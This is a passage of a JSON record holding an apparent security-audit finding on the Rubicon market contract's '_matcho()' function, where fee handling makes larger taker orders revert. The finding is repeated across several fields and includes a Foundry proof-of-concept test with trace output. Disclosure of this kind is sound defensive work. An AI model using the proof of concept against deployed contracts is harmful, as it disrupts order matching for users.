      "mitigation": "## Recommended Mitigation Steps\nSee PoC\n",
      "poc": "## Proof of Concept\nThe following test script shows how to trigger the issue.\n```solidity\npragma solidity ^0.8.0;\n\nimport \"../../contracts/compound-v2-fork/WhitePaperInterestRateModel.sol\";\nimport \"../../contracts/compound-v2-fork/ComptrollerInterface.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20Delegator.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20Delegate.sol\";\nimport \"../../contracts/compound-v2-fork/Comptroller.sol\";\nimport \"../../contracts/utilities/MarketAidFactory.sol\";\nimport \"../../contracts/periphery/TokenWithFaucet.sol\";\nimport \"../../contracts/utilities/MarketAid.sol\";\nimport \"../../contracts/periphery/WETH9.sol\";\nimport \"../../contracts/RubiconMarket.sol\";\nimport \"forge-std/Test.sol\";\n\n/// @notice proxy isn't used here\ncontract MatchingOfferNotWorking is Test {\n  //========================CONSTANTS========================\n  address public owner;\n  address FEE_TO = 0x0000000000000000000000000000000000000FEE;\n  address taker = address(0x1234);\n  address maker = address(0x5678);\n  // core contracts\n  RubiconMarket market;\n  // test tokens\n  TokenWithFaucet RUBI;\n  TokenWithFaucet USDC;\n\n  // deployRubiconProtocolFixture()\n  function setUp() public {\n    owner = msg.sender;\n\n    // deploy new Market instance and init\n    market = new RubiconMarket();\n    market.initialize(FEE_TO);\n    market.setFeeBPS(10);\n\n    // deploy test tokens\n    RUBI = new TokenWithFaucet(address(this), \"RUBI\", \"RUBI\", 18);\n    USDC = new TokenWithFaucet(address(this), \"Test Stablecoin\", \"USDC\", 6);\n\n    // add some $$$ to victim and attacker\n    RUBI.faucet();\n    USDC.faucet();\n    RUBI.transfer(maker, 1000e18);\n    USDC.transfer(taker, 10000e6);\n\n    vm.startPrank(taker);\n    USDC.approve(address(market), type(uint256).max);\n    vm.stopPrank();\n\n    vm.startPrank(maker);\n    RUBI.approve(address(market), type(uint256).max);\n    vm.stopPrank();\n  }\n\n  //========================MARKET_TESTS========================\n\n  function test_MatchingOfferNotWorking() public {\n   // 1. maker submits an offer for selling 1 RUBI at 100 USDC/RUBI\n    uint256 makerRubiBalanceBefore = RUBI.balanceOf(maker);\n    vm.startPrank(maker);\n    uint256 id = market.offer(1e18, RUBI, 100e6, USDC);\n    vm.stopPrank();\n    assertGt(id, 0);\n    uint256 makerRubiBalanceAfter = RUBI.balanceOf(maker);\n    assertEq(makerRubiBalanceBefore - makerRubiBalanceAfter, 1e18);\n\n    // 2. now the taker submits another offer for buying 10 RUBI at 100 USDC/RUBI\n    //    we expect the above selling offer to be fulfilled successfully.\n    //    Meanwhile, a new 9 RUBI buying offer should be created,\n    //    but actually the this offer will be reverted.\n    vm.startPrank(taker);\n    // buying RUBI/USDC at 100 USDC/RUBI\n    vm.expectRevert();\n    id = market.offer(1000e6, USDC, 10e18, RUBI);\n    vm.stopPrank();\n  }\n\n}\n\n```\n\nAnd the log details\n```solidity\nRunning 1 test for test/foundry-tests/MatchingOfferNotWorking.t.sol:MatchingOfferNotWorking\n[PASS] test_MatchingOfferNotWorking() (gas: 422566)\nTraces:\n  [422566] MatchingOfferNotWorking::test_MatchingOfferNotWorking()\n    â”œâ”€ [2629] TokenWithFaucet::balanceOf(0x0000000000000000000000000000000000005678) [staticcall]\n    â”‚   â””â”€ â† 1000000000000000000000\n    â”œâ”€ [0] VM::startPrank(0x0000000000000000000000000000000000005678)\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [246628] RubiconMarket::offer(1000000000000000000, TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 100000000, TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a])\n    â”‚   â”œâ”€ [30321] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000005678, RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000005678, to: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ emit LogItemUpdate(id: 1)\n    â”‚   â”œâ”€ emit emitOffer(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], pay_amt: 1000000000000000000, buy_amt: 100000000)\n    â”‚   â”œâ”€ emit LogSortedOffer(id: 1)\n    â”‚   â””â”€ â† 1\n    â”œâ”€ [0] VM::stopPrank()\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [629] TokenWithFaucet::balanceOf(0x0000000000000000000000000000000000005678) [staticcall]\n    â”‚   â””â”€ â† 999000000000000000000\n    â”œâ”€ [0] VM::startPrank(0x0000000000000000000000000000000000001234)\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [0] VM::expectRevert()\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [167743] RubiconMarket::offer(1000000000, TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 10000000000000000000, TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])\n    â”‚   â”œâ”€ [32321] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000000FEE, 9999)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000000FEE, value: 9999)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [25521] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000005678, 99990000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000005678, value: 99990000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [24995] TokenWithFaucet::transfer(0x0000000000000000000000000000000000001234, 999900000000000000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000001234, value: 999900000000000000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ emit LogItemUpdate(id: 1)\n    â”‚   â”œâ”€ emit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, taker: 0x0000000000000000000000000000000000001234, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], take_amt: 999900000000000000, give_amt: 99990000)\n    â”‚   â”œâ”€ emit emitFee(id: 0x0000000000000000000000000000000000000000000000000000000000000001, taker: 0x0000000000000000000000000000000000001234, feeTo: 0x0000000000000000000000000000000000000FEE, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, asset: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], feeAmt: 9999)\n    â”‚   â”œâ”€ emit LogMatch(id: 0, amount: 1000000000000000000)\n    â”‚   â”œâ”€ [3621] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000000FEE, 0)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000000FEE, value: 0)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [3621] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000005678, 9999)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000005678, value: 9999)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [3095] TokenWithFaucet::transfer(0x0000000000000000000000000000000000001234, 99990000000000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000001234, value: 99990000000000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ emit LogItemUpdate(id: 1)\n    â”‚   â”œâ”€ emit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, taker: 0x0000000000000000000000000000000000001234, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], take_amt: 99990000000000, give_amt: 9999)\n    â”‚   â”œâ”€ emit emitFee(id: 0x0000000000000000000000000000000000000000000000000000000000000001, taker: 0x0000000000000000000000000000000000001234, feeTo: 0x0000000000000000000000000000000000000FEE, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, asset: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], feeAmt: 0)\n    â”‚   â”œâ”€ emit LogMatch(id: 0, amount: 100000000000000)\n    â”‚   â””â”€ â† \"EvmError: Revert\"\n    â”œâ”€ [0] VM::stopPrank()\n    â”‚   â””â”€ â† ()\n    â””â”€ â† ()\n\nTest result: ok. 1 passed; 0 failed; finished in 2.67ms\n```\n\nLet's take a look at this line, we find the actual ````take_amt```` is ````0.9999e18 RUBI```` rather than the expected ````1e18````, the difference is exact the 0.01% of fee.\n```solidity\nemit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001,\n pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148,\n taker: 0x0000000000000000000000000000000000001234,\n maker: 0x0000000000000000000000000000000000005678,\n pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b],\n buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a],\n take_amt: 999900000000000000,\ngive_amt: 99990000)\n```\n\nBack to source code, we can see the issue arises on L1313 of ````_matcho()````,  where ````m_pay_amt```` should be some thing like ````m_pay_amt + fee````.\n\n```solidity\nFile: contracts\\RubiconMarket.sol\n1273:     function _matcho(\n1274:         uint256 t_pay_amt, //taker sell how much\n1275:         ERC20 t_pay_gem, //taker sell which token\n1276:         uint256 t_buy_amt, //taker buy how much\n1277:         ERC20 t_buy_gem, //taker buy which token\n1278:         uint256 pos, //position id\n1279:         bool rounding, //match \"close enough\" orders?\n1280:         address owner,\n1281:         address recipient\n1282:     ) internal returns (uint256 id) {\n1283:         uint256 best_maker_id; //highest maker id\n1284:         uint256 t_buy_amt_old; //taker buy how much saved\n1285:         uint256 m_buy_amt; //maker offer wants to buy this much token\n1286:         uint256 m_pay_amt; //maker offer wants to sell this much token\n1287:\n1288:         // there is at least one offer stored for token pair\n1289:         while (_best[address(t_buy_gem)][address(t_pay_gem)] > 0) {\n1290:             best_maker_id = _best[address(t_buy_gem)][address(t_pay_gem)];\n1291:             m_buy_amt = offers[best_maker_id].buy_amt;\n1292:             m_pay_amt = offers[best_maker_id].pay_amt;\n1293:\n...\n1313:             buy(best_maker_id, min(m_pay_amt, t_buy_amt));\n1314:             emit LogMatch(id, min(m_pay_amt, t_buy_amt));\n1315:             t_buy_amt_old = t_buy_amt;\n1316:             t_buy_amt = sub(t_buy_amt, min(m_pay_amt, t_buy_amt));\n1317:             t_pay_amt = mul(t_buy_amt, t_pay_amt) / t_buy_amt_old;\n1318:\n1319:             if (t_pay_amt == 0 || t_buy_amt == 0) {\n1320:                 break;\n1321:             }\n1322:         }\n1323:\n...\n1341:     }\n\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1313\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManually review\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nThe ````_matcho()```` function is not implemented properly, it might revert while the taking amount is greater than the best offer's amount, leads to order matching failure.\n",
        "recommendation": "## Recommended Mitigation Steps\nSee PoC\n",
        "poc": "## Proof of Concept\nThe following test script shows how to trigger the issue.\n```solidity\npragma solidity ^0.8.0;\n\nimport \"../../contracts/compound-v2-fork/WhitePaperInterestRateModel.sol\";\nimport \"../../contracts/compound-v2-fork/ComptrollerInterface.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20Delegator.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20Delegate.sol\";\nimport \"../../contracts/compound-v2-fork/Comptroller.sol\";\nimport \"../../contracts/utilities/MarketAidFactory.sol\";\nimport \"../../contracts/periphery/TokenWithFaucet.sol\";\nimport \"../../contracts/utilities/MarketAid.sol\";\nimport \"../../contracts/periphery/WETH9.sol\";\nimport \"../../contracts/RubiconMarket.sol\";\nimport \"forge-std/Test.sol\";\n\n/// @notice proxy isn't used here\ncontract MatchingOfferNotWorking is Test {\n  //========================CONSTANTS========================\n  address public owner;\n  address FEE_TO = 0x0000000000000000000000000000000000000FEE;\n  address taker = address(0x1234);\n  address maker = address(0x5678);\n  // core contracts\n  RubiconMarket market;\n  // test tokens\n  TokenWithFaucet RUBI;\n  TokenWithFaucet USDC;\n\n  // deployRubiconProtocolFixture()\n  function setUp() public {\n    owner = msg.sender;\n\n    // deploy new Market instance and init\n    market = new RubiconMarket();\n    market.initialize(FEE_TO);\n    market.setFeeBPS(10);\n\n    // deploy test tokens\n    RUBI = new TokenWithFaucet(address(this), \"RUBI\", \"RUBI\", 18);\n    USDC = new TokenWithFaucet(address(this), \"Test Stablecoin\", \"USDC\", 6);\n\n    // add some $$$ to victim and attacker\n    RUBI.faucet();\n    USDC.faucet();\n    RUBI.transfer(maker, 1000e18);\n    USDC.transfer(taker, 10000e6);\n\n    vm.startPrank(taker);\n    USDC.approve(address(market), type(uint256).max);\n    vm.stopPrank();\n\n    vm.startPrank(maker);\n    RUBI.approve(address(market), type(uint256).max);\n    vm.stopPrank();\n  }\n\n  //========================MARKET_TESTS========================\n\n  function test_MatchingOfferNotWorking() public {\n   // 1. maker submits an offer for selling 1 RUBI at 100 USDC/RUBI\n    uint256 makerRubiBalanceBefore = RUBI.balanceOf(maker);\n    vm.startPrank(maker);\n    uint256 id = market.offer(1e18, RUBI, 100e6, USDC);\n    vm.stopPrank();\n    assertGt(id, 0);\n    uint256 makerRubiBalanceAfter = RUBI.balanceOf(maker);\n    assertEq(makerRubiBalanceBefore - makerRubiBalanceAfter, 1e18);\n\n    // 2. now the taker submits another offer for buying 10 RUBI at 100 USDC/RUBI\n    //    we expect the above selling offer to be fulfilled successfully.\n    //    Meanwhile, a new 9 RUBI buying offer should be created,\n    //    but actually the this offer will be reverted.\n    vm.startPrank(taker);\n    // buying RUBI/USDC at 100 USDC/RUBI\n    vm.expectRevert();\n    id = market.offer(1000e6, USDC, 10e18, RUBI);\n    vm.stopPrank();\n  }\n\n}\n\n```\n\nAnd the log details\n```solidity\nRunning 1 test for test/foundry-tests/MatchingOfferNotWorking.t.sol:MatchingOfferNotWorking\n[PASS] test_MatchingOfferNotWorking() (gas: 422566)\nTraces:\n  [422566] MatchingOfferNotWorking::test_MatchingOfferNotWorking()\n    â”œâ”€ [2629] TokenWithFaucet::balanceOf(0x0000000000000000000000000000000000005678) [staticcall]\n    â”‚   â””â”€ â† 1000000000000000000000\n    â”œâ”€ [0] VM::startPrank(0x0000000000000000000000000000000000005678)\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [246628] RubiconMarket::offer(1000000000000000000, TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 100000000, TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a])\n    â”‚   â”œâ”€ [30321] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000005678, RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000005678, to: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ emit LogItemUpdate(id: 1)\n    â”‚   â”œâ”€ emit emitOffer(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], pay_amt: 1000000000000000000, buy_amt: 100000000)\n    â”‚   â”œâ”€ emit LogSortedOffer(id: 1)\n    â”‚   â””â”€ â† 1\n    â”œâ”€ [0] VM::stopPrank()\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [629] TokenWithFaucet::balanceOf(0x0000000000000000000000000000000000005678) [staticcall]\n    â”‚   â””â”€ â† 999000000000000000000\n    â”œâ”€ [0] VM::startPrank(0x0000000000000000000000000000000000001234)\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [0] VM::expectRevert()\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [167743] RubiconMarket::offer(1000000000, TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 10000000000000000000, TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])\n    â”‚   â”œâ”€ [32321] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000000FEE, 9999)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000000FEE, value: 9999)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [25521] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000005678, 99990000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000005678, value: 99990000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [24995] TokenWithFaucet::transfer(0x0000000000000000000000000000000000001234, 999900000000000000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000001234, value: 999900000000000000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ emit LogItemUpdate(id: 1)\n    â”‚   â”œâ”€ emit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, taker: 0x0000000000000000000000000000000000001234, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], take_amt: 999900000000000000, give_amt: 99990000)\n    â”‚   â”œâ”€ emit emitFee(id: 0x0000000000000000000000000000000000000000000000000000000000000001, taker: 0x0000000000000000000000000000000000001234, feeTo: 0x0000000000000000000000000000000000000FEE, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, asset: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], feeAmt: 9999)\n    â”‚   â”œâ”€ emit LogMatch(id: 0, amount: 1000000000000000000)\n    â”‚   â”œâ”€ [3621] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000000FEE, 0)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000000FEE, value: 0)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [3621] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000005678, 9999)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000001234, to: 0x0000000000000000000000000000000000005678, value: 9999)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ [3095] TokenWithFaucet::transfer(0x0000000000000000000000000000000000001234, 99990000000000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000001234, value: 99990000000000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ emit LogItemUpdate(id: 1)\n    â”‚   â”œâ”€ emit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, taker: 0x0000000000000000000000000000000000001234, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], take_amt: 99990000000000, give_amt: 9999)\n    â”‚   â”œâ”€ emit emitFee(id: 0x0000000000000000000000000000000000000000000000000000000000000001, taker: 0x0000000000000000000000000000000000001234, feeTo: 0x0000000000000000000000000000000000000FEE, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, asset: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], feeAmt: 0)\n    â”‚   â”œâ”€ emit LogMatch(id: 0, amount: 100000000000000)\n    â”‚   â””â”€ â† \"EvmError: Revert\"\n    â”œâ”€ [0] VM::stopPrank()\n    â”‚   â””â”€ â† ()\n    â””â”€ â† ()\n\nTest result: ok. 1 passed; 0 failed; finished in 2.67ms\n```\n\nLet's take a look at this line, we find the actual ````take_amt```` is ````0.9999e18 RUBI```` rather than the expected ````1e18````, the difference is exact the 0.01% of fee.\n```solidity\nemit emitTake(id: 0x0000000000000000000000000000000000000000000000000000000000000001,\n pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148,\n taker: 0x0000000000000000000000000000000000001234,\n maker: 0x0000000000000000000000000000000000005678,\n pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b],\n buy_gem: TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a],\n take_amt: 999900000000000000,\ngive_amt: 99990000)\n```\n\nBack to source code, we can see the issue arises on L1313 of ````_matcho()````,  where ````m_pay_amt```` should be some thing like ````m_pay_amt + fee````.\n\n```solidity\nFile: contracts\\RubiconMarket.sol\n1273:     function _matcho(\n1274:         uint256 t_pay_amt, //taker sell how much\n1275:         ERC20 t_pay_gem, //taker sell which token\n1276:         uint256 t_buy_amt, //taker buy how much\n1277:         ERC20 t_buy_gem, //taker buy which token\n1278:         uint256 pos, //position id\n1279:         bool rounding, //match \"close enough\" orders?\n1280:         address owner,\n1281:         address recipient\n1282:     ) internal returns (uint256 id) {\n1283:         uint256 best_maker_id; //highest maker id\n1284:         uint256 t_buy_amt_old; //taker buy how much saved\n1285:         uint256 m_buy_amt; //maker offer wants to buy this much token\n1286:         uint256 m_pay_amt; //maker offer wants to sell this much token\n1287:\n1288:         // there is at least one offer stored for token pair\n1289:         while (_best[address(t_buy_gem)][address(t_pay_gem)] > 0) {\n1290:             best_maker_id = _best[address(t_buy_gem)][address(t_pay_gem)];\n1291:             m_buy_amt = offers[best_maker_id].buy_amt;\n1292:             m_pay_amt = offers[best_maker_id].pay_amt;\n1293:\n...\n1313:             buy(best_maker_id, min(m_pay_amt, t_buy_amt));\n1314:             emit LogMatch(id, min(m_pay_amt, t_buy_amt));\n1315:             t_buy_amt_old = t_buy_amt;\n1316:             t_buy_amt = sub(t_buy_amt, min(m_pay_amt, t_buy_amt));\n1317:             t_pay_amt = mul(t_buy_amt, t_pay_amt) / t_buy_amt_old;\n1318:\n1319:             if (t_pay_amt == 0 || t_buy_amt == 0) {\n1320:                 break;\n1321:             }\n1322:         }\n1323:\n...\n1341:     }\n\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1313\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManually review\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L1313\n\n\n# Vulnerability details\n\n## Impact\nThe ````_matcho()```` function is not implemented properly, it might revert while the taking amount is greater than the best offer's amount, leads to order matching failure.\n\n## Proof of Concept\nThe following test script shows how to trigger the issue.\n```solidity\npragma solidity ^0.8.0;\n\nimport \"../../contracts/compound-v2-fork/WhitePaperInterestRateModel.sol\";\nimport \"../../contracts/compound-v2-fork/ComptrollerInterface.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20Delegator.sol\";\nimport \"../../contracts/compound-v2-fork/CErc20Delegate.sol\";\nimport \"../../contracts/compound-v2-fork/Comptroller.sol\";\nimport \"../../contracts/utilities/MarketAidFactory.sol\";\nimport \"../../contracts/periphery/TokenWithFaucet.sol\";\nimport \"../../contracts/utilities/MarketAid.sol\";\nimport \"../../contracts/periphery/WETH9.sol\";\nimport \"../../contracts/RubiconMarket.sol\";\nimport \"forge-std/Test.sol\";\n\n/// @notice proxy isn't used here\ncontract MatchingOfferNotWorking is Test {\n  //========================CONSTANTS========================\n  address public owner;\n  address FEE_TO = 0x0000000000000000000000000000000000000FEE;\n  address taker = address(0x1234);\n  address maker = address(0x5678);\n  // core contracts\n  RubiconMarket market;\n  // test tokens\n  TokenWithFaucet RUBI;\n  TokenWithFaucet USDC;\n\n  // deployRubiconProtocolFixture()\n  function setUp() public {\n    owner = msg.sender;\n\n    // deploy new Market instance and init\n    market = new RubiconMarket();\n    market.initialize(FEE_TO);\n    market.setFeeBPS(10);\n\n    // deploy test tokens\n    RUBI = new TokenWithFaucet(address(this), \"RUBI\", \"RUBI\", 18);\n    USDC = new TokenWithFaucet(address(this), \"Test Stablecoin\", \"USDC\", 6);\n\n    // add some $$$ to victim and attacker\n    RUBI.faucet();\n    USDC.faucet();\n    RUBI.transfer(maker, 1000e18);\n    USDC.transfer(taker, 10000e6);\n\n    vm.startPrank(taker);\n    USDC.approve(address(market), type(uint256).max);\n    vm.stopPrank();\n\n    vm.startPrank(maker);\n    RUBI.approve(address(market), type(uint256).max);\n    vm.stopPrank();\n  }\n\n  //========================MARKET_TESTS========================\n\n  function test_MatchingOfferNotWorking() public {\n   // 1. maker submits an offer for selling 1 RUBI at 100 USDC/RUBI\n    uint256 makerRubiBalanceBefore = RUBI.balanceOf(maker);\n    vm.startPrank(maker);\n    uint256 id = market.offer(1e18, RUBI, 100e6, USDC);\n    vm.stopPrank();\n    assertGt(id, 0);\n    uint256 makerRubiBalanceAfter = RUBI.balanceOf(maker);\n    assertEq(makerRubiBalanceBefore - makerRubiBalanceAfter, 1e18);\n\n    // 2. now the taker submits another offer for buying 10 RUBI at 100 USDC/RUBI\n    //    we expect the above selling offer to be fulfilled successfully.\n    //    Meanwhile, a new 9 RUBI buying offer should be created,\n    //    but actually the this offer will be reverted.\n    vm.startPrank(taker);\n    // buying RUBI/USDC at 100 USDC/RUBI\n    vm.expectRevert();\n    id = market.offer(1000e6, USDC, 10e18, RUBI);\n    vm.stopPrank();\n  }\n\n}\n\n```\n\nAnd the log details\n```solidity\nRunning 1 test for test/foundry-tests/MatchingOfferNotWorking.t.sol:MatchingOfferNotWorking\n[PASS] test_MatchingOfferNotWorking() (gas: 422566)\nTraces:\n  [422566] MatchingOfferNotWorking::test_MatchingOfferNotWorking()\n    â”œâ”€ [2629] TokenWithFaucet::balanceOf(0x0000000000000000000000000000000000005678) [staticcall]\n    â”‚   â””â”€ â† 1000000000000000000000\n    â”œâ”€ [0] VM::startPrank(0x0000000000000000000000000000000000005678)\n    â”‚   â””â”€ â† ()\n    â”œâ”€ [246628] RubiconMarket::offer(1000000000000000000, TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 100000000, TokenWithFaucet: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a])\n    â”‚   â”œâ”€ [30321] TokenWithFaucet::transferFrom(0x0000000000000000000000000000000000005678, RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000)\n    â”‚   â”‚   â”œâ”€ emit Transfer(from: 0x0000000000000000000000000000000000005678, to: RubiconMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000)\n    â”‚   â”‚   â””â”€ â† true\n    â”‚   â”œâ”€ emit LogItemUpdate(id: 1)\n    â”‚   â”œâ”€ emit emitOffer(id: 0x0000000000000000000000000000000000000000000000000000000000000001, pair: 0x466a72696a5097346305fd11b91586c4ba7becfaf99e93d36de04eca0fe58148, maker: 0x0000000000000000000000000000000000005678, pay_gem: TokenWithFaucet: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 